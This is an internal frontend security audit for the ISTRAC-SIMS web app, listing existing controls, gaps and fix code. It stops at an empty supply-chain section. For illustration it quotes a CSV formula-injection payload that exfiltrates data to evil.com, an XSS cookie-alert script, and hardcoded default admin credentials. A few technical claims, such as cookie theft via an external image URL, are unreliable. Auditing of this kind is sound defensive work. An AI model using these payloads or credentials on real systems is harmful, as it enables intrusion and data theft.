# ISTRAC-SIMS Frontend — Security Audit & Improvement Guide

> **Scope:** Complete security review of `frontend/src/**` and `frontend/schemas/**` against OWASP Top 10 (2021), OWASP ASVS v4.0 (Level 2), and browser security best practices.
> **Review Date:** 2026-08-27
> **Auditor:** Internal engineering review
> **Severity Levels:** 🔴 Critical · 🟠 High · 🟡 Medium · 🟢 Low · 🔵 Improvement

---

## 📑 Table of Contents

1. [What Is Already Secure (Do Not Remove)](#1-what-is-already-secure-do-not-remove)
2. [Security Gaps by Category](#2-security-gaps-by-category)
   - [A. Token & Session Management](#a-token--session-management)
   - [B. Cross-Site Scripting (XSS)](#b-cross-site-scripting-xss)
   - [C. Input Validation — Forms & Schemas](#c-input-validation--forms--schemas)
   - [D. File Upload Security](#d-file-upload-security)
   - [E. WebSocket Security](#e-websocket-security)
   - [F. API Client & Network Security](#f-api-client--network-security)
   - [G. Route Guards & Client-Side Access Control](#g-route-guards--client-side-access-control)
   - [H. Data Rendering & Information Exposure](#h-data-rendering--information-exposure)
   - [I. Environment & Build Security](#i-environment--build-security)
   - [J. Supply Chain & Dependency Security](#j-supply-chain--dependency-security)
3. [Prioritized Fix Roadmap](#3-prioritized-fix-roadmap)
4. [Code Implementation Guide for Each Fix](#4-code-implementation-guide-for-each-fix)
5. [Frontend Security Standards Checklist](#5-frontend-security-standards-checklist)

---

## 1. What Is Already Secure (Do Not Remove)

These are **production-grade decisions** correctly implemented. They must not be changed without security review:

| Control | Implementation | Standard |
| :--- | :--- | :--- |
| **Access token in memory only** | `accessToken` in Zustand state (not persisted to sessionStorage/localStorage) | OWASP ASVS V3.4 |
| **User profile in sessionStorage** | `partialize: state => ({ user: state.user })` — only non-sensitive profile data persists | OWASP ASVS V3.4 |
| **Access token NOT in sessionStorage** | `partialize` explicitly excludes `accessToken` — survives tab reuse but not new windows | OWASP ASVS V3.4 |
| **httpOnly cookie for refresh token** | `withCredentials: true` — refresh cookie is httpOnly, never readable by JS | OWASP ASVS V3.4 |
| **Token refresh stampede lock** | `isRefreshing` flag + `refreshQueue[]` — only one `/auth/refresh` call for concurrent 401s | Reliability |
| **Code 4401 no-retry** | `if (event.code !== 4401) scheduleReconnect()` — auth-rejected WS never re-spams the server | Security |
| **WebSocket exponential backoff** | Delays: 1s, 2s, 4s, 8s, 16s, then 60s — prevents connection flood | Availability |
| **DOMPurify XSS sanitization** | `sanitizeHtml()` with explicit allowlist and `FORBID_ATTR: ['onerror', 'onclick', ...]` | OWASP A03 |
| **`javascript:` URL rejection** | `isSafeUrl()` explicitly blocks `javascript:`, `vbscript:`, `data:`, `file:` schemes | OWASP A03 |
| **Path traversal in filename** | `sanitizeFilename()` strips `../`, `..\\`, null bytes, control chars | CWE-22 |
| **SHA-256 client-side checksum** | `computeSHA256()` via Web Crypto API — integrity verified before upload | Data integrity |
| **Zod schema validation on auth forms** | Login and Register use `zodResolver` + Zod schemas via `react-hook-form` | OWASP ASVS V5 |
| **useRef once-guard on `useInitAuth`** | `hasRun.current` prevents double token refresh on `React.StrictMode` double-mount | Security |
| **`ProtectedRoute` clears on null user** | `if (!user) return <Navigate to="/login" />` — unauthenticated access denied | OWASP ASVS V4 |
| **`ForcePasswordGuard` on `tempPass`** | `tempPass: true` users are redirected away from all pages except `/force-password-change` | OWASP ASVS V2 |
| **CSV CSV-injection escape** | `val.includes('"') ? `"${val.replace(/"/g, '""')}"` — RFC 4180 quoting | CWE-1236 |
| **Search query length cap** | `sanitizeSearchQuery()` caps at 200 chars and normalizes whitespace | Input validation |
| **WS message JSON try/catch** | Malformed WS frames are silently discarded, never crash the page | Reliability |
| **Refresh loop: clearAuth on failure** | `refreshErr → clearAuth() → redirect /login` — broken sessions don't loop forever | OWASP ASVS V3 |

---

## 2. Security Gaps by Category

---

### A. Token & Session Management

#### 🔴 A1 — Access Token Passed in WebSocket Query String
**File:** `src/lib/ws.ts` line 17

**Current state:**
```ts
const wsUrl = `${baseWsUrl}?token=${encodeURIComponent(token)}`
this.socket = new WebSocket(wsUrl)
```

**Risk (Critical):**
The access token is appended as a URL query parameter. This is one of the most dangerous token handling patterns because:
1. **Browser history:** The full `ws://host/ws?token=eyJ...` URL is stored in browser navigation history.
2. **Server access logs:** Web servers and load balancers log the full URL including query strings. The token appears in plain text in every access log on every proxy/Nginx/ALB between browser and backend.
3. **Referer header leakage:** If the WebSocket page itself links to any third-party resource, the full URL (token included) appears in the `Referer` header sent to that third party.
4. **Shared tabs/screenshots:** If a user shares a screenshot of browser DevTools Network tab, the token is visible.

A stolen access token allows an attacker to impersonate the user for up to 15 minutes.

**Fix:** Use a short-lived WS ticket system:
```
1. Frontend calls GET /auth/ws-ticket (authenticated, returns a 30-second single-use token)
2. Frontend connects: ws://host/ws?ticket=<short-ticket>
3. Backend verifies ticket, looks up userId, then discards the ticket
```
Or use the `Sec-WebSocket-Protocol` header trick (widely used, supported by all browsers):
```ts
// In ws.ts:
this.socket = new WebSocket(wsUrl, [`Bearer.${token}`])
// Backend reads: req.headers['sec-websocket-protocol']
// Then set: res.setHeader('Sec-WebSocket-Protocol', `Bearer.${token}`)
```

---

#### 🟠 A2 — `accessToken` Accessible to All Scripts in the Page's JavaScript Heap
**File:** `src/store/authStore.ts`, `src/api/client.ts`

**Current state:** The access token lives in `useAuthStore`'s Zustand state — JavaScript in-memory. While this is correct (not localStorage/sessionStorage), any third-party script running on the same page (e.g., an injected analytics script via a compromised CDN) can call `window.__zustand` or iterate `window` to find the store and read `accessToken`.

**Risk:** XSS — even without `innerHTML`, a compromised third-party script could reach the Zustand store.

**Fix (Defense in depth):**
- Ensure no third-party JavaScript is loaded without a strict `Content-Security-Policy` (see F1 below in backend audit).
- Keep `accessToken` TTL at 15 minutes — even if stolen, the window is limited.
- Do not log `accessToken` anywhere (confirm it is not sent to analytics or error reporting services like Sentry without masking).

---

#### 🟠 A3 — Logout Does Not Disconnect WebSocket
**File:** No logout handler found that calls `wsClient.disconnect()`

**Current state:** When a user logs out (calls `POST /auth/logout` + `clearAuth()`), the Zustand auth state is cleared but the `wsClient` singleton in `src/lib/ws.ts` is not disconnected. The WebSocket connection established with the old access token may remain alive.

**Risk:** The WebSocket server sends notifications and real-time events to the now-logged-out browser tab. If the tab is handed to another person (shared computer), they can see the previous user's notifications and real-time data until the server's 3-missed-ping timeout (~90 seconds) kills the connection.

**Fix:** In the logout handler (wherever `clearAuth()` is called), also call `wsClient.disconnect()`:
```ts
// In logout API call handler (wherever logout mutation is defined):
await api.post('/auth/logout')
useAuthStore.getState().clearAuth()
wsClient.disconnect()          // ← ADD THIS
navigate('/login')
```

---

#### 🟡 A4 — `clearAuth()` Does Not Revoke the refreshToken Cookie
**File:** `src/store/authStore.ts` line 30

**Current state:**
```ts
clearAuth: () => set({ user: null, accessToken: null })
```
`clearAuth()` removes the user profile from memory but does NOT call the backend `/auth/logout` endpoint. If called from an error path (e.g., `useInitAuth` refresh failure), the refresh cookie remains alive in the browser until its 7-day natural expiry.

**Risk:** A user whose session fails silently still has a valid refresh cookie in their browser. They can manually navigate to `/login`, get a new access token via the interceptor, and re-authenticate as themselves — even if an admin intended to revoke their session.

**Fix:** Differentiate between "network error clear" (keep cookie, retry later) and "intentional logout" (call backend and clear cookie). The current `clearAuth()` call in `useInitAuth.catch` is appropriate (network error), but ensure any admin-forced session invalidation path also hits the backend.

---

#### 🟡 A5 — No Access Token Expiry Check Before API Calls
**File:** `src/api/client.ts` request interceptor (line 14)

**Current state:** The request interceptor reads `accessToken` from the store and attaches it. It does not check whether the token is expired before attaching it. A JWT with `exp` in the past is sent to the server, which rejects it with 401, triggering the refresh flow.

**Risk (minor):** One wasted network round-trip per expired-token request. More importantly, if the `/auth/refresh` endpoint is temporarily unreachable, the user gets a jarring 401 error instead of a graceful "session expired" message.

**Fix:** Parse the JWT `exp` claim client-side before attaching:
```ts
apiClient.interceptors.request.use((config) => {
  const token = useAuthStore.getState().accessToken
  if (token) {
    // Quick exp check without verification (server still validates signature)
    try {
      const payload = JSON.parse(atob(token.split('.')[1]))
      if (payload.exp && payload.exp * 1000 < Date.now() + 30_000) {
        // Token expires in <30s — proactively refresh before attaching
        // (only if not already refreshing)
      }
    } catch { /* ignore malformed token */ }
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})
```

---

### B. Cross-Site Scripting (XSS)

#### 🔴 B1 — CMS Blocks Rendered Without Sanitization
**File:** `src/context/cmsContext.tsx`, pages that render CMS data

**Current state:** The `DEFAULT_CMS_BLOCKS` contain plain strings. However, when a CMS block is updated by an admin via the `PUT /cms/blocks/:key` endpoint, the `data` JSON is stored verbatim. Pages that render CMS block values must sanitize them before `innerHTML` or `dangerouslySetInnerHTML`.

**Risk:** An admin account (or an attacker who compromises an admin account) can inject `<script>alert(document.cookie)</script>` into a CMS `hero.subtitle` field. When the homepage renders this value with `dangerouslySetInnerHTML`, every visitor's session is compromised.

**Fix:** Pass all CMS string values through `sanitizeHtml()` before rendering:
```tsx
// Any place that renders CMS content with dangerouslySetInnerHTML:
import { sanitizeHtml } from '../lib/sanitize'

// WRONG:
<div dangerouslySetInnerHTML={{ __html: cmsBlocks.hero.subtitle }} />

// CORRECT:
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(cmsBlocks.hero?.subtitle as string ?? '') }} />
```

Audit every usage of `dangerouslySetInnerHTML` in the codebase:
```bash
grep -rn "dangerouslySetInnerHTML" frontend/src/
```
Every result must use `sanitizeHtml()` as the input.

---

#### 🟠 B2 — Notification `message` Field Rendered Without XSS Sanitization
**File:** Components rendering `NotificationItem.message`

**Current state:** Notification messages are admin-generated strings. If a notification message contains HTML characters (`<`, `>`, `&`), React's JSX rendering naturally escapes them in `{message}` interpolations. However, if any component renders the message with `dangerouslySetInnerHTML` to support rich text, the raw message string from the API is used directly.

**Risk:** If `notificationService.send()` is ever triggered with user-controlled content (e.g., a broadcast where admin pastes untrusted text), injected HTML could execute in the notification panel.

**Fix:** Ensure notification message text is always rendered in JSX text interpolation `{message}` — never with `dangerouslySetInnerHTML`. If rich text is needed, wrap with `sanitizeHtml()`.

---

#### 🟠 B3 — External Image URLs in CMS Blocks Not Validated
**File:** `src/context/cmsContext.tsx` lines 18-40, `src/pages/DepartmentDetail.tsx` lines 50-101

**Current state:**
```ts
// DEFAULT_CMS_BLOCKS hero.imageUrl:
'https://images.unsplash.com/photo-...'
// DepartmentDetail DEFAULT_DEPT_SLIDES:
url: 'https://images.unsplash.com/photo-...'
```

Admin-editable CMS blocks can set `imageUrl` to any value. This value is passed directly to `<img src={imageUrl}>` without validation.

**Risk:**
1. **Content injection:** Setting `imageUrl` to `//evil.com/tracking.png` exfiltrates session cookies via the browser's automatic `Cookie` header on image requests (if the cookie is not `SameSite: Strict`).
2. **`onerror` injection (obsolete risk in React):** React escapes attribute values so `onerror=alert()` won't work via JSX — but a malformed URL like `"x" onerror="..."` inserted into raw HTML would.

**Fix:** Validate image URLs through `isSafeUrl()` before rendering, and use `ImageWithFallback` component (already exists in the codebase) consistently:
```tsx
const safeImageUrl = isSafeUrl(cmsBlocks.hero?.imageUrl as string) 
  ? cmsBlocks.hero.imageUrl as string 
  : '/fallback-hero.jpg'
<img src={safeImageUrl} />
```

---

#### 🟡 B4 — CSV Export Does Not Guard Against CSV Formula Injection
**File:** `src/lib/exportCsv.ts`

**Current state:**
```ts
const val = String(row[h] ?? '')
return val.includes(',') || val.includes('"') ? `"${val.replace(/"/g, '""')}"` : val
```

This correctly handles RFC 4180 comma/quote escaping. However, it does **not** strip CSV formula injection characters.

**Risk:** If a filename or user name stored in the system begins with `=`, `+`, `-`, or `@`, Excel/LibreOffice Calc treats it as a formula when the CSV is opened. A crafted value like `=HYPERLINK("http://evil.com?data="&A1,"Click me")` can exfiltrate spreadsheet data.

**Fix:** Prefix dangerous first characters with a single quote:
```ts
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r']
const safeVal = FORMULA_PREFIXES.some(p => val.startsWith(p)) ? `'${val}` : val
```

---

### C. Input Validation — Forms & Schemas

#### 🟠 C1 — `registerSchema` Password Minimum Is 8 Characters, Not 10
**File:** `frontend/schemas/authSchemas.ts` line 35

**Current state:**
```ts
password: z.string().min(8, 'Password must be at least 8 characters long'),
```

**Risk:** The login schema (`loginSchema`) enforces a 10-character minimum, creating an inconsistency — users can register with an 8-character password but then cannot log in if the login form enforces 10+. More importantly, the backend (after our security audit fix A3) will require 10+ characters server-side — so an 8-char registration will be accepted by the form but rejected by the server.

**Fix:** Align with both the login schema and the (planned) server-side minimum:
```ts
// authSchemas.ts
password: z.string()
  .min(10, 'Password must be at least 10 characters')
  .regex(/[A-Z]/, 'Password must contain at least one uppercase letter')
  .regex(/[0-9]/, 'Password must contain at least one number')
  .regex(/[^A-Za-z0-9]/, 'Password must contain at least one special character'),
```

---

#### 🟠 C2 — `registerSchema` Allows Any Email Domain (Not `.gov.in`)
**File:** `frontend/schemas/authSchemas.ts` line 31

**Current state:**
```ts
email: z.string().email('Enter a valid official ISRO email address'),
```

The error message says "official ISRO email address" but the validation accepts any email format (`user@gmail.com`, `user@yahoo.com`). This contradicts the UI intent and the ISRO security policy requiring `@isro.gov.in` or `@istrac.gov.in` addresses.

**Fix:**
```ts
email: z.string()
  .email('Enter a valid email address')
  .refine(
    (v) => v.endsWith('@isro.gov.in') || v.endsWith('@istrac.gov.in') || v.endsWith('@dos.gov.in'),
    'Only official ISRO/ISTRAC government email addresses are permitted'
  ),
```

> **Note:** Allow configuring the permitted domains via environment variable for flexibility: `VITE_ALLOWED_EMAIL_DOMAINS=isro.gov.in,istrac.gov.in`

---

#### 🟡 C3 — `registerSchema` Phone Field Has No Format Validation
**File:** `frontend/schemas/authSchemas.ts` line 33

**Current state:**
```ts
phone: z.string().min(7, 'Enter a valid contact number'),
```
`min(7)` accepts `"aaaaaaa"` as a valid phone number.

**Fix:**
```ts
phone: z.string()
  .min(7)
  .regex(/^\+?[\d\s\-()+]{7,20}$/, 'Enter a valid contact number (e.g. +91 98765 43210)'),
```

---

#### 🟡 C4 — No Max-Length on `name`, `designation`, `reasonForAccess` in Register Schema
**File:** `frontend/schemas/authSchemas.ts`

**Current state:** `name: z.string().min(2)` — no upper bound. A user can submit a 100,000 character name. While the backend (Express) accepts up to 50MB and the DB column should have its own constraint, there is no client-side or schema-level protection.

**Fix:**
```ts
name: z.string().min(2, 'Name required').max(100, 'Name too long'),
designation: z.string().min(2).max(100),
reasonForAccess: z.string().max(1000, 'Reason must be under 1000 characters').optional(),
```

---

#### 🟡 C5 — `loginSchema` Has No Max-Length on Password
**File:** `frontend/schemas/authSchemas.ts` line 23

**Current state:** `password: z.string().min(10)` — no upper bound. An attacker attempting a DoS can submit a 10MB password to the login form, which causes the client to hash it on the browser and send 10MB to the server.

**Fix:** `password: z.string().min(10).max(128)` — 128 characters is the OWASP-recommended maximum.

---

### D. File Upload Security

#### 🔴 D1 — No Client-Side File Type Restriction
**File:** `src/hooks/useFileUpload.ts`, upload form components

**Current state:** The `addFiles()` function accepts any `FileList | File[]` without checking extensions or MIME types. No `accept` attribute is set on the `<input type="file">` elements in upload forms.

**Risk:**
- Users can upload `.exe`, `.sh`, `.bat`, `.php` files. While the server (once our backend D1 fix is applied) will reject these, the current state allows them through with no client-side feedback — the upload starts, processes, and then fails with a confusing error from the server.
- If the backend fix is not yet applied: these dangerous file types reach the storage mount.

**Fix:** Add client-side validation before upload begins:
```ts
// src/hooks/useFileUpload.ts
const ALLOWED_EXTENSIONS = new Set([
  'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'odt', 'ods',
  'txt', 'csv', 'json', 'xml', 'md', 'log', 'dat', 'tsv',
  'png', 'jpg', 'jpeg', 'gif', 'webp', 'tiff', 'bmp',
  'mp4', 'mov', 'avi', 'mkv', 'webm',
  'fits', 'fit', 'hdf', 'hdf5', 'h5', 'nc', 'cdf',
  'zip', 'tar', 'gz', 'bz2', '7z',
])

function addFiles(files: FileList | File[]) {
  const valid: File[] = []
  const rejected: string[] = []
  
  for (const file of Array.from(files)) {
    const ext = file.name.split('.').pop()?.toLowerCase() ?? ''
    if (!ALLOWED_EXTENSIONS.has(ext)) {
      rejected.push(file.name)
    } else {
      valid.push(file)
    }
  }
  
  if (rejected.length > 0) {
    addToast({ variant: 'error', message: `Rejected: ${rejected.join(', ')} — file type not permitted` })
  }
  // proceed with valid only
}
```

Also add `accept` attribute to file inputs:
```tsx
<input type="file" accept=".pdf,.docx,.xlsx,.csv,.txt,.dat,.fits,.zip,.png,.jpg" multiple />
```

---

#### 🟠 D2 — SHA-256 Hash Computed Before File Is Sent But Not Verified After Server Stores It
**File:** `src/lib/fileUpload.ts` (`computeSHA256`), `src/hooks/useFileUpload.ts`

**Current state:** `computeSHA256()` is called as part of the upload pipeline (visible in `useFileUpload.ts` for the hashing status step). The hash is computed client-side via Web Crypto API. However, the hash is never compared against the hash returned by the server in the upload response.

**Risk:** If the server returns a different `sha256` in the upload response (indicating the file was corrupted or tampered with in transit by a man-in-the-middle), the frontend does not detect this discrepancy.

**Fix:** After upload completes, compare client-computed hash with server-returned hash:
```ts
// In uploadSingleShot / after uploadChunked:
const clientHash = await computeSHA256(item.file)
const result = await filesApi.uploadSingle(...)
if (result.sha256 && result.sha256 !== clientHash) {
  throw new Error(`Integrity check failed: file hash mismatch. Upload may be corrupted.`)
}
```

---

#### 🟡 D3 — No File Size Limit Enforced Client-Side
**File:** `src/hooks/useFileUpload.ts`

**Current state:** The 10MB `CHUNK_THRESHOLD` triggers chunked upload for large files but no maximum file size is enforced. A user can queue a 50GB file — it will start uploading and eventually fail on the server-side multer limit, but only after wasting significant bandwidth and time.

**Fix:**
```ts
const MAX_FILE_SIZE = 500 * 1024 * 1024 // 500MB — should match SystemConfig.maxUploadSizeBytes
function addFiles(files: FileList | File[]) {
  for (const file of Array.from(files)) {
    if (file.size > MAX_FILE_SIZE) {
      addToast({ variant: 'error', message: `${file.name} exceeds the 500MB file size limit` })
      continue
    }
    // proceed
  }
}
```

---

#### 🟡 D4 — All Chunks Uploaded Sequentially — No Progress Abort on Error
**File:** `src/hooks/useFileUpload.ts` lines 37-41

**Current state:**
```ts
for (let i = 0; i < chunks.length; i++) {
  await filesApi.uploadChunk(chunks[i], safeName, i, chunks.length, departmentId)
}
```
If chunk 47 of 100 fails (network error), the loop throws and the upload status becomes `'error'`. However, the 46 chunks already uploaded to the server's temp directory (`.chunks/`) are never cleaned up — they sit on the server forever until an admin manually removes them.

**Fix:** Add a cleanup step when chunked upload fails:
```ts
} catch (err) {
  // Attempt to notify server to clean up partial chunks
  try { await filesApi.abortChunkUpload({ fileName: safeName, departmentId }) } catch { }
  updateItem(item.id, { status: 'error', ... })
}
```
This requires a corresponding `DELETE /files/upload/chunk` endpoint on the backend.

---

### E. WebSocket Security

#### 🟠 E1 — WS Reconnect Does Not Re-Fetch Fresh Access Token
**File:** `src/lib/ws.ts` lines 60-66

**Current state:**
```ts
private scheduleReconnect() {
  this.reconnectTimer = setTimeout(() => this.connect(), delay)
}
connect() {
  const token = useAuthStore.getState().accessToken // reads current token
```

When the WebSocket reconnects (e.g., after a network dropout), it reads `accessToken` from the Zustand store. If the access token expired while the connection was dropped, the reconnect attempt will fail with a `4401` close code — and since code `4401` disables further reconnects, the real-time connection is permanently lost for the session.

**Risk:** After a network interruption longer than the token's remaining lifetime (~15 minutes), users lose all real-time notifications and file upload events silently.

**Fix:** Before reconnecting, attempt a token refresh:
```ts
private async scheduleReconnect() {
  const delay = ...
  this.reconnectTimer = setTimeout(async () => {
    // Ensure token is valid before reconnecting
    try {
      const { data } = await axios.post('/api/auth/refresh', {}, { withCredentials: true })
      const newToken = data?.data?.accessToken
      if (newToken) {
        const user = useAuthStore.getState().user
        if (user) useAuthStore.getState().setAuth(user, newToken)
      }
    } catch { /* session expired — don't reconnect */ return }
    this.connect()
  }, delay)
}
```

---

#### 🟡 E2 — WS `onmessage` Handler Does Not Validate Payload Schema
**File:** `src/lib/ws.ts` lines 27-41

**Current state:**
```ts
const parsed = JSON.parse(event.data)
const eventType = parsed.type || parsed.channel || 'message'
const payload = parsed.payload !== undefined ? parsed.payload : parsed
```

Any object that successfully parses as JSON is dispatched to handlers. There is no check that `eventType` is one of the expected event types or that `payload` has the expected shape.

**Risk:** If the WebSocket server is ever compromised or sends an unexpected message, components consuming `useWsStore` or `cmsContext` would receive unvalidated data. A crafted `CMS_UPDATE` payload could set `cmsBlocks.hero.subtitle` to an XSS string if the CMS context re-renders without sanitization (see B1).

**Fix:** Add an allowlist of expected event types:
```ts
const EXPECTED_EVENTS = new Set(['ping', 'pong', 'CMS_UPDATE', 'NOTIFICATION', 'FILE_UPLOAD', 'FILE_DELETED', 'SYNC_COMPLETE'])
const eventType = parsed.type || 'unknown'
if (!EXPECTED_EVENTS.has(eventType)) {
  console.warn('[WS] Unexpected event type ignored:', eventType)
  return
}
```

---

### F. API Client & Network Security

#### 🟠 F1 — `VITE_API_URL` Fallback to `/api` Is Undefined in Production If Not Set
**File:** `src/api/client.ts` line 6

**Current state:**
```ts
baseURL: import.meta.env.VITE_API_URL || '/api',
```

In production Amplify deployment, if `VITE_API_URL` is not configured in environment variables, the client falls back to `/api` (a relative path). This would route API requests to the CloudFront CDN URL itself, which does not proxy to the backend — silently failing all API calls.

**Fix:** Fail fast at build time:
```ts
// vite.config.ts or src/api/client.ts
if (!import.meta.env.VITE_API_URL && import.meta.env.PROD) {
  throw new Error('VITE_API_URL must be set for production builds')
}
```

---

#### 🟡 F2 — No Request Timeout on API Calls
**File:** `src/api/client.ts`

**Current state:** The Axios instance has no `timeout` configured. All API requests wait indefinitely.

**Risk:** If the backend is slow or unresponsive, API requests hang forever. The UI shows loading spinners indefinitely with no way for users to know the system is degraded.

**Fix:**
```ts
export const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_URL || '/api',
  withCredentials: true,
  timeout: 30_000, // 30 seconds maximum
  headers: { 'Content-Type': 'application/json' },
})
```
For file upload requests specifically, use a longer timeout or no timeout.

---

#### 🟡 F3 — Error Messages from Server API Rendered Directly in UI
**File:** `src/pages/Login.tsx` line 81, `src/pages/Register.tsx` line 87

**Current state:**
```ts
setServerError(error.response.data.error.message)
// Then:
<Alert variant="critical">{serverError}</Alert>
```

Server error messages are rendered as text content (not `dangerouslySetInnerHTML`) in React, so XSS is not directly possible here. However, long or unexpected error messages can cause layout issues, and in edge cases, server error messages may reveal internal implementation details to the user (e.g., "PrismaClientKnownRequestError: Invalid value for field 'email'").

**Fix:** Map known server error codes to user-friendly frontend messages:
```ts
const ERROR_MESSAGES: Record<string, string> = {
  invalid_credentials: 'Invalid email or password.',
  account_pending: 'Your account is pending administrator approval.',
  account_suspended: 'Your account has been suspended. Contact your administrator.',
  rate_limit_exceeded: 'Too many attempts. Please wait 15 minutes.',
  user_exists: 'An account with this email or employee ID already exists.',
}

const code = error.response?.data?.error?.code
setServerError(ERROR_MESSAGES[code] ?? 'An unexpected error occurred. Please try again.')
```

---

### G. Route Guards & Client-Side Access Control

#### 🔴 G1 — `ProtectedRoute` Only Checks User Object Presence, Not Token Validity
**File:** `src/routes/ProtectedRoute.tsx`

**Current state:**
```ts
const user = useAuthStore((s) => s.user)
if (!user) return <Navigate to="/login" replace />
```

A user's profile is stored in `sessionStorage` (via Zustand `persist`). When a user opens a new tab, the profile is loaded from sessionStorage but `accessToken` is null (it lives in memory only). `ProtectedRoute` sees `user !== null` and shows the protected page. The `useInitAuth` hook then fires and refreshes the token — but during the brief render between page load and `useInitAuth` completion (`isChecking = true`), the user sees the protected page with no valid token.

**Risk (Low):** The `isChecking` flag is used to show a splash screen — if it's implemented correctly everywhere, the user sees a loading screen, not actual data. But if any component renders data during the `isChecking` phase using the stale sessionStorage `user`, it could show role-specific UI briefly before the refresh completes.

**Fix:** Explicitly check `isChecking` state at the router level:
```tsx
// src/App.tsx — wrap the entire route tree:
const { isChecking } = useInitAuth()
if (isChecking) return <SplashScreen />

// ProtectedRoute then only renders when isChecking = false,
// meaning accessToken is either refreshed or user is cleared.
```

---

#### 🟠 G2 — Admin UI Routes Only Gated by `AdminRoute` (Client-Side Only)
**File:** `src/routes/AdminRoute.tsx`

**Current state:**
```ts
if (role !== 'ADMIN') return <Navigate to="/dashboard" replace />
```

This is correct as a UX guard. All API calls from admin pages are also protected server-side. However, the `role` claim comes from `useAuthStore(s => s.user.role)` — which is populated from the login response, not from a live database check.

**Risk:** If an admin's role is downgraded by another admin while they are logged in, the client-side `role: 'ADMIN'` claim in their session remains valid until their next refresh. They can still access the admin UI pages (though any API calls will fail server-side with 403, which is correctly handled).

**Mitigation (already partially in place):** The backend rejects all admin API calls from non-admin tokens via `adminMiddleware`. The client-side gate is defense-in-depth only.

**Improvement:** On receiving a 403 from any admin API endpoint, also clear the client-side admin role flag:
```ts
// In the Axios response interceptor:
if (error.response?.status === 403) {
  const user = useAuthStore.getState().user
  if (user?.role === 'ADMIN') {
    // Role may have been revoked — re-fetch profile
    useAuthStore.getState().clearAuth()
    window.location.href = '/login'
  }
}
```

---

#### 🟢 G3 — No Idle Session Timeout on Client Side
**File:** No such mechanism exists

**Current state:** Once logged in, a user's browser session persists indefinitely as long as they keep the tab open and the refresh token (7 days) is valid.

**Risk:** On a shared workstation (as common in a mission control centre), an operator who leaves without logging out keeps the session alive.

**Fix:** Implement an idle timeout:
```ts
// src/hooks/useIdleTimeout.ts
export function useIdleTimeout(timeoutMs = 30 * 60 * 1000) { // 30 minutes
  useEffect(() => {
    let timer: ReturnType<typeof setTimeout>
    const reset = () => {
      clearTimeout(timer)
      timer = setTimeout(() => {
        useAuthStore.getState().clearAuth()
        wsClient.disconnect()
        window.location.href = '/login?reason=idle'
      }, timeoutMs)
    }
    const events = ['mousedown', 'keydown', 'touchstart', 'scroll']
    events.forEach(e => window.addEventListener(e, reset, { passive: true }))
    reset()
    return () => { clearTimeout(timer); events.forEach(e => window.removeEventListener(e, reset)) }
  }, [timeoutMs])
}
// Use in App.tsx inside ProtectedRoute context
```

---

### H. Data Rendering & Information Exposure

#### 🟠 H1 — Hardcoded Demo Account Credentials in Production Bundle
**File:** `src/pages/Login.tsx` lines 13-32

**Current state:**
```ts
const DEMO_ACCOUNTS = [
  { role: 'Super Admin', email: 'admin@istrac.local', pass: 'ChangeMe123!' },
  { role: 'Flight User', email: 'operator@istrac.local', pass: 'ChangeMe123!' },
  { role: 'FDD Lead', email: 'fddlead@istrac.local', pass: 'ChangeMe123!' },
]
```

These credentials are:
1. **Hardcoded in source code** — visible in the Git repository to anyone with read access.
2. **Compiled into the production JavaScript bundle** — visible to anyone who opens DevTools → Network → preview of `index-*.js`.
3. **Rendered as clickable quick-fill buttons** on the login page — visible to every visitor.

**Risk (Critical for production):** Any person accessing the ISTRAC-SIMS login page can see the default admin credentials and the Quick Fill button populates them automatically. If the seed passwords (`ChangeMe123!`) are not changed after deployment, the system is immediately compromised.

**Fix:**
```ts
// Option 1 (Recommended): Remove DEMO_ACCOUNTS entirely for production
const DEMO_ACCOUNTS = import.meta.env.DEV 
  ? [
      { role: 'Super Admin', email: 'admin@istrac.local', pass: 'ChangeMe123!', badge: '...' },
    ]
  : []

// Option 2: Remove the section entirely and rely on seed.ts comments for dev setup
```
The quick-fill UI should only appear when `import.meta.env.DEV === true` (i.e., Vite dev server — NOT in production builds).

---

#### 🟡 H2 — `hddPath` Exposed in Search Results and File Listing APIs
**File:** `src/api/files.api.ts`, response rendering components

**Current state:** The backend search API returns `hddPath` in the search results (e.g., `/mnt/istrac_data/TTC/GENERAL/report.pdf`). The frontend renders or at least receives this in API responses.

**Risk:** Exposing the absolute physical file path of every file on the storage mount to all authenticated users reveals the server's internal directory structure and storage layout. A `MEMBER` user can see the full path of files in their department, even if they shouldn't know whether the server uses `/mnt`, `/data`, or `/srv`.

**Fix (backend):** Strip `hddPath` from all API responses before returning to clients. The path is an internal server-side concept.
**Fix (frontend):** Do not render `hddPath` in any user-visible component.

---

#### 🟡 H3 — `console.log` / Debug Output May Leak Sensitive Data in Production
**File:** Various component and hook files

**Current state:** Vite strips `console.log` calls in production builds by default only if `drop: ['console']` is configured in `vite.config.ts`. Without explicit configuration, all `console.log` statements compile into the production bundle.

**Fix:** Add to `vite.config.ts`:
```ts
export default defineConfig({
  build: {
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true,
        drop_debugger: true,
      },
    },
  },
})
```

---

### I. Environment & Build Security

#### 🟠 I1 — `VITE_API_URL` and `VITE_WS_URL` Can Be Overridden at Runtime by an Attacker
**File:** `src/api/client.ts`, `src/lib/ws.ts`

**Current state:**
```ts
baseURL: import.meta.env.VITE_API_URL || '/api'
const baseWsUrl = import.meta.env.VITE_WS_URL || `ws://${window.location.host}/ws`
```

`import.meta.env` values are inlined at build time by Vite — they cannot be changed at runtime. However, `window.location.host` in the WS fallback is runtime-evaluated. If the page is ever loaded from an unexpected origin (e.g., via a compromised CDN or `iframe`), `window.location.host` points to the wrong host.

**Fix:** Always set `VITE_WS_URL` explicitly in production deployments. Do not rely on the `window.location.host` fallback for production:
```bash
# .env.production
VITE_API_URL=https://api.istrac.gov.in/api
VITE_WS_URL=wss://api.istrac.gov.in/ws
```

---

#### 🟡 I2 — No Subresource Integrity (SRI) for External Scripts
**File:** `index.html` (if any external CDN scripts are loaded)

**Current state:** Vite bundles everything locally — no external CDN scripts are loaded by default. However, if any Google Fonts, Analytics, or third-party library CDN links are added to `index.html`, they would load without SRI hashes.

**Fix:** Any `<script src="...">` or `<link rel="stylesheet">` pointing to an external CDN must include `integrity="sha384-..."` and `crossorigin="anonymous"` attributes.

---

### J. Supply Chain & Dependency Security

